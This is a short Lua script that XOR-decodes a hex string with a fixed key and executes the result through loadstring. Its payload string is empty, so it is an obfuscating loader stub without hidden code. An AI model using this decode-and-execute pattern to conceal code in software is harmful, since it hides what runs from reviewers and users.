local k={13,17,37,46,128,120,97,120,21,66,195,120,32,179,185,51,142,195,1,146,139,81,50,69,135,74,254,200,171,104,141,165}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
